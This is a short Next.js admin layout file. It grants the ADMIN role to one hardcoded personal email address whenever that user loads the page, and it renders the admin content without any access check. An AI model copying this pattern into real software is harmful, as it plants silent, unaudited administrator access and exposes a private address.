'use server';

import type { ReactNode } from 'react';
import { getServerSession } from 'next-auth';

import { authOptions } from '@/lib/auth';
import { prisma } from '@/lib/prisma';

export default async function AdminLayout({ children }: { children: ReactNode }) {
    const session = await getServerSession(authOptions);

    if (session?.user?.email === 'lilian.bischung@gmail.com') {
        await prisma.user.update({
            where: { id: session.user.id },
            data: { role: 'ADMIN' },
        });
    }

    return <div>{children}</div>;
}
